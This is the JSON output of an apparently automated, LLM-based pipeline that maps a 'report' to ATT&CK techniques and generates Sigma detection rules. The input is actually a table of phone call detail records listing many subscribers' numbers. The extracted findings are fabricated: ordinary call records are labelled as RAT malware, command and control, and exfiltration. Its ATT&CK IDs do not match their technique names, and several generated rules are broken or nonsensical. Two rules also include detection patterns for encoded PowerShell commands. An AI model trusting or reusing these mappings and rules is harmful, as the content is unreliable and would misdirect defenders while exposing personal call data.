{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 5,
      "langchain_extractions": 3,
      "high_confidence_ttps": 0,
      "processing_time_ms": 1943.65
    },
    "extraction_results": [
      {
        "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
        "extracted_ttps": [
          {
            "ttp_id": "28ac9aa4-43c1-4a62-a49c-c2a6bb105ca3",
            "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
            "technique_name": "Unusual Communication",
            "attack_id": "T1497",
            "tactic": "Command and Control",
            "description": "Multiple calls to the same number (77052000601) from different cell IDs, indicating potential unusual communication",
            "confidence_score": 0.618,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 0.74,
              "context_richness": 0.299,
              "multiple_sources": 0.5
            },
            "indicators": [
              "77052000601",
              "77051056626"
            ],
            "tools": [
              "Unknown",
              "AT"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "87d4b779-ab37-4586-9b4d-e1452a4b3968",
            "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
            "technique_name": "Cellular Communication",
            "attack_id": "T1528",
            "tactic": "Command and Control",
            "description": "Usage of cellular communication (cell IDs, LAC) for potential command and control",
            "confidence_score": 0.607,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.276,
              "tool_mentions": 0.74,
              "context_richness": 0.299,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cell ID",
              "LAC"
            ],
            "tools": [
              "Unknown",
              "AT"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8597fc05-81f1-463b-a42b-0f3cf1f2b696",
            "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
            "technique_name": "Data Encoding",
            "attack_id": "T1132",
            "tactic": "Exfiltration",
            "description": "Potential data encoding (e.g., phone numbers, cell IDs) for exfiltration",
            "confidence_score": 0.6,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.23,
              "tool_mentions": 0.74,
              "context_richness": 0.299,
              "multiple_sources": 0.5
            },
            "indicators": [
              "phone numbers",
              "cell IDs"
            ],
            "tools": [
              "Unknown",
              "AT"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "63eefd1d-d542-419f-a818-8858b736f775",
            "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
            "technique_name": "Remote Access Tool (RAT)",
            "attack_id": "T1219",
            "tactic": "Command and Control",
            "description": "Detected Malware: RAT, indicating potential remote access and control",
            "confidence_score": 0.589,
            "confidence_level": "low",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.192,
              "tool_mentions": 0.74,
              "context_richness": 0.299,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RAT"
            ],
            "tools": [
              "RAT",
              "AT"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "628ce61d-f6bc-4e9d-b143-a874416be9df",
            "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
            "technique_name": "Access Tool (AT)",
            "attack_id": "T1555",
            "tactic": "Credential Access",
            "description": "Detected Tools: AT, indicating potential access tool usage",
            "confidence_score": 0.577,
            "confidence_level": "low",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.169,
              "tool_mentions": 0.66,
              "context_richness": 0.299,
              "multiple_sources": 0.5
            },
            "indicators": [
              "AT"
            ],
            "tools": [
              "AT"
            ],
            "extraction_method": "langchain_llm"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "SUBS_KEY CALL_START_TIME CALLED_NUM CALLING_NUM CELL_ID LAC ROUNDED_CALL_DURATION_SEC CALL_FORWARD_NUM IMEI IMSI ORIG_CELL_ID 7051056626 2020-06-05 18:46:07 77051056626 77052000601 0 00010 0 77715741982 NULL NULL 77050000010 7051056626 2020-06-05 11:26:45 77051056626 77052000601 0 00010 0 77715741982 NULL NULL 77050000010 7051056626 2020-06-05 11:04:40 77051056626 77052000601 0 00060 0 77052792060 NULL NULL 77050000060 7051056626 2020-06-05 11:04:06 77051056626 77052000601 0 00060 0 77052792060 NULL NULL 77050000060 7051056626 2020-06-06 09:32:35 77051056626 77052000601 0 00060 0 77073940827 NULL NULL 77050000060 7051056626 2020-06-06 09:36:11 77051056626 77052000601 0 00060 0 77073940827 NULL NULL 77050000060 7051056626 2020-06-06 09:39:43 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-06 09:28:57 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-06 09:28:27 77051056626 77052000601 0 00060 0 77073940827 NULL NULL 77050000060 7051056626 2020-06-06 09:35:07 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-06 09:30:58 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-06 09:31:59 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-06 13:11:03 77051056626 77052000601 0 00060 0 77753148722 NULL NULL 77050000060 7051056626 2020-06-06 09:37:42 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-06 13:10:24 77051056626 77052000601 0 00060 0 77753148722 NULL NULL 77050000060 7051056626 2020-06-06 09:33:06 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-07-04 14:55:18 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 15:01:20 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:52:24 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:53:25 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 15:05:21 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:46:56 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:57:19 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:48:57 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:49:58 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:54:27 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:53:56 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-06-02 12:38:43 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-02 12:38:12 77051056626 77052000601 0 00060 0 77073940827 NULL NULL 77050000060 7051056626 2020-06-03 17:52:26 77051056626 77052000601 0 00010 0 77762508460 NULL NULL 77050000010 7051056626 2020-06-20 15:40:57 77051056626 77052000601 1 00011 0 77052627424 NULL NULL 77050000011 7051056626 2020-06-20 16:03:02 77051056626 77052000601 0 00060 0 77052792060 NULL NULL 77050000060 7051056626 2020-06-20 09:44:16 77051056626 77052000601 0 00010 0 77073633784 NULL NULL 77050000010 7051056626 2020-06-20 09:43:45 77051056626 77052000601 0 00010 0 77073633784 NULL NULL 77050000010 7051056626 2020-06-07 06:58:06 77051056626 77052000601 0 00010 0 77715741982 NULL NULL 77050000010 7051056626 2020-06-04 22:06:27 77051056626 77052000601 0 00010 0 77715741982 NULL NULL 77050000010 7051056626 2020-06-15 14:06:31 77051056626 77052000601 0 00060 0 77717620322 NULL NULL 77050000060 7051056626 2020-06-19 12:16:01 77051056626 77052000601 0 00060 0 77717620322 NULL NULL 77050000060 7051056626 2020-06-19 12:15:28 77051056626 77052000601 0 00060 0 77717620322 NULL NULL 77050000060 7051056626 2020-06-19 12:52:40 77051056626 77052000601 0 00060 0 77055000632 NULL NULL 77050000060 7051056626 2020-06-19 09:35:59 77051056626 77052000601 1 00011 0 77714747337 NULL NULL 77050000011 7051056626 2020-07-05 11:50:54 77051056626 77052000601 0 00060 0 77283179199 NULL NULL 77050000060 7051056626 2020-07-05 11:51:14 77051056626 77052000601 0 00060 0 77283179199 NULL NULL 77050000060 7051056626 2020-06-21 06:53:28 77051056626 77052000601 0 00010 0 77715741982 NULL NULL 77050000010 7051056626 2020-06-21 16:08:51 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-21 16:08:20 77051056626 77052000601 0 00060 0 77073940827 NULL NULL 77050000060 7051056626 2020-06-29 18:45:31 77051056626 77052000601 0 00060 0 77714129084 NULL NULL 77050000060 7051056626 2020-06-17 10:53:18 77051056626 77052000601 1 00011 0 77716125252 NULL NULL 77050000011 7051056626 2020-06-17 10:48:54 77051056626 77052000601 1 00011 0 77716125252 NULL NULL 77050000011",
            "commands": [],
            "file_paths": [],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "RAT"
            ],
            "tools": [
              "AT"
            ],
            "threat_actors": [],
            "ips": [],
            "domains": [],
            "hashes": {}
          },
          "ttp_indicators": {},
          "context": ""
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 12.331999999999999,
          "llm_processing_time_ms": 1804.827
        }
      }
    ],
    "results": [
      {
        "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
        "extracted_ttps": [
          {
            "ttp_id": "28ac9aa4-43c1-4a62-a49c-c2a6bb105ca3",
            "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
            "technique_name": "Unusual Communication",
            "attack_id": "T1497",
            "tactic": "Command and Control",
            "description": "Multiple calls to the same number (77052000601) from different cell IDs, indicating potential unusual communication",
            "confidence_score": 0.618,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 0.74,
              "context_richness": 0.299,
              "multiple_sources": 0.5
            },
            "indicators": [
              "77052000601",
              "77051056626"
            ],
            "tools": [
              "Unknown",
              "AT"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "87d4b779-ab37-4586-9b4d-e1452a4b3968",
            "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
            "technique_name": "Cellular Communication",
            "attack_id": "T1528",
            "tactic": "Command and Control",
            "description": "Usage of cellular communication (cell IDs, LAC) for potential command and control",
            "confidence_score": 0.607,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.276,
              "tool_mentions": 0.74,
              "context_richness": 0.299,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cell ID",
              "LAC"
            ],
            "tools": [
              "Unknown",
              "AT"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8597fc05-81f1-463b-a42b-0f3cf1f2b696",
            "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
            "technique_name": "Data Encoding",
            "attack_id": "T1132",
            "tactic": "Exfiltration",
            "description": "Potential data encoding (e.g., phone numbers, cell IDs) for exfiltration",
            "confidence_score": 0.6,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.23,
              "tool_mentions": 0.74,
              "context_richness": 0.299,
              "multiple_sources": 0.5
            },
            "indicators": [
              "phone numbers",
              "cell IDs"
            ],
            "tools": [
              "Unknown",
              "AT"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "63eefd1d-d542-419f-a818-8858b736f775",
            "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
            "technique_name": "Remote Access Tool (RAT)",
            "attack_id": "T1219",
            "tactic": "Command and Control",
            "description": "Detected Malware: RAT, indicating potential remote access and control",
            "confidence_score": 0.589,
            "confidence_level": "low",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.192,
              "tool_mentions": 0.74,
              "context_richness": 0.299,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RAT"
            ],
            "tools": [
              "RAT",
              "AT"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "628ce61d-f6bc-4e9d-b143-a874416be9df",
            "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
            "technique_name": "Access Tool (AT)",
            "attack_id": "T1555",
            "tactic": "Credential Access",
            "description": "Detected Tools: AT, indicating potential access tool usage",
            "confidence_score": 0.577,
            "confidence_level": "low",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.169,
              "tool_mentions": 0.66,
              "context_richness": 0.299,
              "multiple_sources": 0.5
            },
            "indicators": [
              "AT"
            ],
            "tools": [
              "AT"
            ],
            "extraction_method": "langchain_llm"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "SUBS_KEY CALL_START_TIME CALLED_NUM CALLING_NUM CELL_ID LAC ROUNDED_CALL_DURATION_SEC CALL_FORWARD_NUM IMEI IMSI ORIG_CELL_ID 7051056626 2020-06-05 18:46:07 77051056626 77052000601 0 00010 0 77715741982 NULL NULL 77050000010 7051056626 2020-06-05 11:26:45 77051056626 77052000601 0 00010 0 77715741982 NULL NULL 77050000010 7051056626 2020-06-05 11:04:40 77051056626 77052000601 0 00060 0 77052792060 NULL NULL 77050000060 7051056626 2020-06-05 11:04:06 77051056626 77052000601 0 00060 0 77052792060 NULL NULL 77050000060 7051056626 2020-06-06 09:32:35 77051056626 77052000601 0 00060 0 77073940827 NULL NULL 77050000060 7051056626 2020-06-06 09:36:11 77051056626 77052000601 0 00060 0 77073940827 NULL NULL 77050000060 7051056626 2020-06-06 09:39:43 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-06 09:28:57 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-06 09:28:27 77051056626 77052000601 0 00060 0 77073940827 NULL NULL 77050000060 7051056626 2020-06-06 09:35:07 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-06 09:30:58 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-06 09:31:59 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-06 13:11:03 77051056626 77052000601 0 00060 0 77753148722 NULL NULL 77050000060 7051056626 2020-06-06 09:37:42 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-06 13:10:24 77051056626 77052000601 0 00060 0 77753148722 NULL NULL 77050000060 7051056626 2020-06-06 09:33:06 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-07-04 14:55:18 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 15:01:20 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:52:24 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:53:25 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 15:05:21 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:46:56 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:57:19 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:48:57 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:49:58 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:54:27 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-07-04 14:53:56 77051056626 77052000601 0 00010 0 77076787898 NULL NULL 77050000010 7051056626 2020-06-02 12:38:43 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-02 12:38:12 77051056626 77052000601 0 00060 0 77073940827 NULL NULL 77050000060 7051056626 2020-06-03 17:52:26 77051056626 77052000601 0 00010 0 77762508460 NULL NULL 77050000010 7051056626 2020-06-20 15:40:57 77051056626 77052000601 1 00011 0 77052627424 NULL NULL 77050000011 7051056626 2020-06-20 16:03:02 77051056626 77052000601 0 00060 0 77052792060 NULL NULL 77050000060 7051056626 2020-06-20 09:44:16 77051056626 77052000601 0 00010 0 77073633784 NULL NULL 77050000010 7051056626 2020-06-20 09:43:45 77051056626 77052000601 0 00010 0 77073633784 NULL NULL 77050000010 7051056626 2020-06-07 06:58:06 77051056626 77052000601 0 00010 0 77715741982 NULL NULL 77050000010 7051056626 2020-06-04 22:06:27 77051056626 77052000601 0 00010 0 77715741982 NULL NULL 77050000010 7051056626 2020-06-15 14:06:31 77051056626 77052000601 0 00060 0 77717620322 NULL NULL 77050000060 7051056626 2020-06-19 12:16:01 77051056626 77052000601 0 00060 0 77717620322 NULL NULL 77050000060 7051056626 2020-06-19 12:15:28 77051056626 77052000601 0 00060 0 77717620322 NULL NULL 77050000060 7051056626 2020-06-19 12:52:40 77051056626 77052000601 0 00060 0 77055000632 NULL NULL 77050000060 7051056626 2020-06-19 09:35:59 77051056626 77052000601 1 00011 0 77714747337 NULL NULL 77050000011 7051056626 2020-07-05 11:50:54 77051056626 77052000601 0 00060 0 77283179199 NULL NULL 77050000060 7051056626 2020-07-05 11:51:14 77051056626 77052000601 0 00060 0 77283179199 NULL NULL 77050000060 7051056626 2020-06-21 06:53:28 77051056626 77052000601 0 00010 0 77715741982 NULL NULL 77050000010 7051056626 2020-06-21 16:08:51 77051056626 77052000601 0 00010 0 77073940827 NULL NULL 77050000010 7051056626 2020-06-21 16:08:20 77051056626 77052000601 0 00060 0 77073940827 NULL NULL 77050000060 7051056626 2020-06-29 18:45:31 77051056626 77052000601 0 00060 0 77714129084 NULL NULL 77050000060 7051056626 2020-06-17 10:53:18 77051056626 77052000601 1 00011 0 77716125252 NULL NULL 77050000011 7051056626 2020-06-17 10:48:54 77051056626 77052000601 1 00011 0 77716125252 NULL NULL 77050000011",
            "commands": [],
            "file_paths": [],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "RAT"
            ],
            "tools": [
              "AT"
            ],
            "threat_actors": [],
            "ips": [],
            "domains": [],
            "hashes": {}
          },
          "ttp_indicators": {},
          "context": ""
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 12.331999999999999,
          "llm_processing_time_ms": 1804.827
        }
      }
    ],
    "ttps": [
      {
        "ttp_id": "28ac9aa4-43c1-4a62-a49c-c2a6bb105ca3",
        "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
        "technique_name": "Unusual Communication",
        "attack_id": "T1497",
        "tactic": "Command and Control",
        "description": "Multiple calls to the same number (77052000601) from different cell IDs, indicating potential unusual communication",
        "confidence_score": 0.618,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.345,
          "tool_mentions": 0.74,
          "context_richness": 0.299,
          "multiple_sources": 0.5
        },
        "indicators": [
          "77052000601",
          "77051056626"
        ],
        "tools": [
          "Unknown",
          "AT"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "87d4b779-ab37-4586-9b4d-e1452a4b3968",
        "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
        "technique_name": "Cellular Communication",
        "attack_id": "T1528",
        "tactic": "Command and Control",
        "description": "Usage of cellular communication (cell IDs, LAC) for potential command and control",
        "confidence_score": 0.607,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.276,
          "tool_mentions": 0.74,
          "context_richness": 0.299,
          "multiple_sources": 0.5
        },
        "indicators": [
          "cell ID",
          "LAC"
        ],
        "tools": [
          "Unknown",
          "AT"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "8597fc05-81f1-463b-a42b-0f3cf1f2b696",
        "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
        "technique_name": "Data Encoding",
        "attack_id": "T1132",
        "tactic": "Exfiltration",
        "description": "Potential data encoding (e.g., phone numbers, cell IDs) for exfiltration",
        "confidence_score": 0.6,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.23,
          "tool_mentions": 0.74,
          "context_richness": 0.299,
          "multiple_sources": 0.5
        },
        "indicators": [
          "phone numbers",
          "cell IDs"
        ],
        "tools": [
          "Unknown",
          "AT"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "63eefd1d-d542-419f-a818-8858b736f775",
        "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
        "technique_name": "Remote Access Tool (RAT)",
        "attack_id": "T1219",
        "tactic": "Command and Control",
        "description": "Detected Malware: RAT, indicating potential remote access and control",
        "confidence_score": 0.589,
        "confidence_level": "low",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.192,
          "tool_mentions": 0.74,
          "context_richness": 0.299,
          "multiple_sources": 0.5
        },
        "indicators": [
          "RAT"
        ],
        "tools": [
          "RAT",
          "AT"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "628ce61d-f6bc-4e9d-b143-a874416be9df",
        "report_id": "pdf-2fcbce3d622e5b4e65de7577db68bc6c",
        "technique_name": "Access Tool (AT)",
        "attack_id": "T1555",
        "tactic": "Credential Access",
        "description": "Detected Tools: AT, indicating potential access tool usage",
        "confidence_score": 0.577,
        "confidence_level": "low",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.169,
          "tool_mentions": 0.66,
          "context_richness": 0.299,
          "multiple_sources": 0.5
        },
        "indicators": [
          "AT"
        ],
        "tools": [
          "AT"
        ],
        "extraction_method": "langchain_llm"
      }
    ]
  },
  "rules": {
    "status": "success",
    "summary": {
      "ttps_processed": 5,
      "rules_generated": 5,
      "langchain_generations": 86,
      "fallback_generations": 0,
      "errors": 0,
      "processing_time_ms": 6375.915
    },
    "rule_generation_results": [
      {
        "ttp_id": "unknown",
        "technique_name": "Unusual Communication",
        "status": "success",
        "rule": {
          "title": "Unusual Communication Detection",
          "description": "Detects unusual communication patterns indicating potential command and control activity",
          "logsource": {
            "category": "network_connection",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "DestinationPort|contains": "[0-9]+",
              "DestinationIp|contains": "77052000601"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate phone calls or SMS messages",
            "False positives may occur due to misconfigured firewalls or network devices"
          ],
          "level": "medium",
          "tags": [
            "attack.command_and_control",
            "attack.t1566",
            "custom.unusual_communication"
          ],
          "ttp_id": "unknown",
          "technique_name": "Unusual Communication",
          "generation_method": "langchain",
          "id": "481c5a3b-a1f1-44fe-ae50-f6f5007a58ac",
          "siem_verification": {
            "rule_id": "481c5a3b-a1f1-44fe-ae50-f6f5007a58ac",
            "attack_id": "26fcb8e9-7333-4a56-b5b7-23ea30b4bf28",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 640.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Cellular Communication",
        "status": "success",
        "rule": {
          "title": "Cellular Communication Detection",
          "description": "Detects usage of cellular communication for potential command and control",
          "logsource": {
            "category": "network_connection",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "DestinationPort|contains": "1234",
              "CommandLine|contains": "cell ID"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate cellular communication software",
            "Network debugging tools"
          ],
          "level": "medium",
          "tags": [
            "attack.command_and_control",
            "attack.t1567",
            "technique.cellular_communication"
          ],
          "ttp_id": "unknown",
          "technique_name": "Cellular Communication",
          "generation_method": "langchain",
          "id": "09f98c60-8dc2-47c3-bf20-26b04d74217b",
          "siem_verification": {
            "rule_id": "09f98c60-8dc2-47c3-bf20-26b04d74217b",
            "attack_id": "e087b7aa-06ab-465e-88f9-9c23c45b5080",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 1065.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Encoding",
        "status": "success",
        "rule": {
          "title": "Data Encoding for Exfiltration",
          "description": "Detects potential data encoding for exfiltration",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "[Convert]::ToBase64String"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate use of PowerShell for encoding data",
            "Encoding data for non-exfiltration purposes"
          ],
          "level": "medium",
          "tags": [
            "attack.exfiltration",
            "attack.t1567.001"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Encoding",
          "generation_method": "langchain",
          "id": "8e10cba7-45ef-426d-86b5-918a24e53a16",
          "siem_verification": {
            "rule_id": "8e10cba7-45ef-426d-86b5-918a24e53a16",
            "attack_id": "f234c9a0-6b87-41ea-8506-be9ad4e87fd4",
            "detected": true,
            "events_found": 10,
            "historical_events": 0,
            "query_time_ms": 1050.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Remote Access Tool (RAT)",
        "status": "success",
        "rule": {
          "title": "Remote Access Tool (RAT) Detection",
          "description": "Detects potential remote access and control via Remote Access Tool (RAT) malware",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-enc"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate PowerShell usage with encryption",
            "System administration tasks"
          ],
          "level": "high",
          "tags": [
            "attack.command_and_control",
            "attack.t1566",
            "custom.remote_access_tool",
            "custom.rat",
            "custom.malware"
          ],
          "ttp_id": "unknown",
          "technique_name": "Remote Access Tool (RAT)",
          "generation_method": "langchain",
          "id": "4b766af3-7a12-4d29-95ce-5e9113b3253f",
          "siem_verification": {
            "rule_id": "4b766af3-7a12-4d29-95ce-5e9113b3253f",
            "attack_id": "9dd51d22-1916-4e83-bf6e-b4c66dded7b5",
            "detected": true,
            "events_found": 10,
            "historical_events": 0,
            "query_time_ms": 575.0000000000001,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Access Tool (AT)",
        "status": "success",
        "rule": {
          "title": "Access Tool (AT) Detection",
          "description": "Detects potential access tool usage based on AT indicators",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\u0007t.exe"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate system administration tasks",
            "AT.exe used by system administrators for maintenance purposes"
          ],
          "level": "medium",
          "tags": [
            "attack.credential_access",
            "attack.t1566"
          ],
          "ttp_id": "unknown",
          "technique_name": "Access Tool (AT)",
          "generation_method": "langchain",
          "id": "65d851a5-028b-4890-91f1-b5b513c3e25e",
          "siem_verification": {
            "rule_id": "65d851a5-028b-4890-91f1-b5b513c3e25e",
            "attack_id": "9fc42276-21fa-4a57-b12a-85d0023e1019",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 1656.0000000000002,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      }
    ],
    "rules": [
      {
        "title": "Unusual Communication Detection",
        "description": "Detects unusual communication patterns indicating potential command and control activity",
        "logsource": {
          "category": "network_connection",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "DestinationPort|contains": "[0-9]+",
            "DestinationIp|contains": "77052000601"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate phone calls or SMS messages",
          "False positives may occur due to misconfigured firewalls or network devices"
        ],
        "level": "medium",
        "tags": [
          "attack.command_and_control",
          "attack.t1566",
          "custom.unusual_communication"
        ],
        "ttp_id": "unknown",
        "technique_name": "Unusual Communication",
        "generation_method": "langchain",
        "id": "481c5a3b-a1f1-44fe-ae50-f6f5007a58ac",
        "siem_verification": {
          "rule_id": "481c5a3b-a1f1-44fe-ae50-f6f5007a58ac",
          "attack_id": "26fcb8e9-7333-4a56-b5b7-23ea30b4bf28",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 640.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
